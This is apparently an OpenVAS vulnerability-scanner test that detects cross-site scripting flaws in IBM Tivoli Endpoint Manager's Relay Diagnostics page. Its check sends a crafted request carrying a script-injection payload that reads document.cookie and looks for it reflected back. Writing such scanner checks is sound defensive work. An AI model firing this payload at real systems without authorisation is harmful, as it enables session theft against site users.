###############################################################################
# OpenVAS Vulnerability Test
#
# IBM Tivoli Endpoint Manager Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:ibm:tivoli_endpoint_manager";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.809365");
  script_version("2019-08-30T12:32:13+0000");
  script_cve_id("CVE-2014-6137", "CVE-2014-6113");
  script_bugtraq_id(72559, 80071);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2019-08-30 12:32:13 +0000 (Fri, 30 Aug 2019)");
  script_tag(name:"creation_date", value:"2016-10-18 13:23:56 +0530 (Tue, 18 Oct 2016)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("IBM Tivoli Endpoint Manager Multiple Cross Site Scripting Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with IBM Tivoli
  Endpoint Manager and is prone to multiple cross site scripting vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted request via HTTP GET and checks whether
  it is possible to conduct a XSS attack.");

  script_tag(name:"insight", value:"The flaw is due to an improper sanitization
  of user supplied input to 'url' parameter while requesting Relay Diagnostics
  page and Web Reports page.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject arbitrary web script or HTML.");

  script_tag(name:"affected", value:"IBM Tivoli Endpoint Manager versions
  9.1 prior to 9.1.1229 and 9.2.x prior to 9.2.1.48.");

  script_tag(name:"solution", value:"Upgrade to IBM Tivoli Endpoint Manager
  version 9.1.1229, or 9.2.1.48 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/130341");
  script_xref(name:"URL", value:"http://www-01.ibm.com/support/docview.wss?uid=swg21692516");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_ibm_endpoint_manager_web_detect.nasl");
  script_mandatory_keys("ibm_endpoint_manager/installed");
  script_require_ports("Services/www", 52311);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))
  exit(0);

if(!dir = get_app_location(port:port, cpe:CPE))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/cgi-bin/bfenterprise/BESGatherMirrorNew.exe/-status?' +
      'http://"><script>alert(document.cookie)</script>';

if(http_vuln_check(port:port, url:url, check_header:TRUE,
                   pattern:"<script>alert\(document.cookie\)</script>",
                   extra_check:make_list('<TITLE>Configuration', 'URL')))
{
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);